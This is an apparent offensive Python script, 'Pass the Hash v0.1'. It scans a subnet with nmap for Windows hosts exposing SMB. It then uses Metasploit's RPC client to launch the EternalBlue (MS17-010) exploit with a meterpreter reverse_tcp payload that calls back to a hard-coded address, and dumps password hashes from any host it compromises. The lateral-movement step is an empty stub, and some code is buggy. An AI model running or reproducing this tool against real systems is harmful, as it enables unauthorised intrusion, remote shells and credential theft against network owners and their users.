from __future__ import print_function

import nmap
import re
import sys
import subprocess
from metasploit.msfrpc import MsfRpcClient
import ssl
import time

def header():
    print("""
      ___                     ___     
     /  /\        ___        /__/\    
    /  /::\      /  /\       \  \:\   
   /  /:/\:\    /  /:/        \__\:\  
  /  /:/~/:/   /  /:/     ___ /  /::\ 
 /__/:/ /:/   /  /::\    /__/\  /:/\:\\
 \  \:\/:/   /__/:/\:\   \  \:\/:/__\/
  \  \::/    \__\/  \:\   \  \::/     
   \  \:\         \  \:\   \  \:\     
    \  \:\         \__\/    \  \:\    
     \__\/                   \__\/ 
     
          Pass the Hash v0.1   
    """)

def convertIpToRange(ip):
	rgx = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.')
	return rgx.match(ip).group() + '0-255'

def gatherHashes(blob):
    """
    Returns a list of tuples (username, userID, hash)
    """
    rgx = re.compile(r'([A-Za-z0-9]+):(\d+:)([A-Za-z0-9]+:[A-Za-z0-9]+):')
    dataGroups = []
    for r in rgx.finditer(blob):
        dataGroups.append(r.groups())
    return dataGroups

def nmScan(ip):
    """
    Returns a list of dictionaries:
        { 'ip': '...', osfamily': '...', 'osgen': [...] }
    """
    targets = []
    range = convertIpToRange(ip)
    nm = nmap.PortScanner()
    print("Starting nmap scan over range: " + range + "...")
    nm.scan(hosts=range, arguments="-O -n -p445,139")
    hosts = nm.all_hosts()
	# For each running machine IP picked up by nmap
    for host in hosts:
		# If they have OS information
    	if 'osmatch' in nm[host]:
            host_obj = {'ip': host, 'osfamily': "", 'osgen': []}
			# Look through all possible OS matches
            for os in nm[host]['osmatch']:
                for c in os['osclass']:
					# If the OS family is Windows add the machine to possible targets
                    if c['osfamily'] == "Windows":
                        if len(host_obj['osfamily']) == 0:
                            host_obj['osfamily'] = c['osfamily']
                        host_obj['osgen'].append(c['osgen'])
            if host_obj['osfamily'] == "Windows":
                targets.append(host_obj)
    return targets

def eternalBlue(ip):
    # Setup SSL fix
    try:
        _create_unverified_https_context = ssl._create_unverified_context
    except AttributeError:
        pass
    else:
        ssl._create_default_https_context = _create_unverified_https_context
    # Create the connection to the RPC client
    client = MsfRpcClient('password')
    # Load eternal blue exploit
    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
    exploit['RHOST'] = ip
    # Load the reverse_tcp shell payload
    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
    payload['LHOST'] = '10.202.208.230'
    # Exploit the host
    exploit.execute(payload=payload)
    proc = exploit.execute(payload=payload)
    time.sleep(5)
    # Get the shell and run the hashdump
    shell = client.sessions.session(proc.get('job_id'))
    if shell == None:
        return None
    shell.runsingle('run post/windows/gather/hashdump')
    while(True):
        output = shell.read()
        if( len(output) > 0):
            print(output)
        if(':::' in output):
            return gatherHashes(output)

def main():
    header()
    ip = sys.argv[1]
    targets = nmScan(ip)
    print('Found ' + str(len(targets)) + ' possibly vulnerable machines...')
    # Try to break into machines with eternal blue
    initHashData = []
    for i in range(len(targets)):
        hashData = eternalBlue(targets[i].ip)
        if hashData != None:
            targets.pop(i)
            initHashData = hashData
            break
    if len(initHashData) > 0:
        # Found access to network start spidering
        pass
    else:
        print('Could not gain access to network... bye!')
    


if __name__ == "__main__":
    # execute only if run as a script
    main()

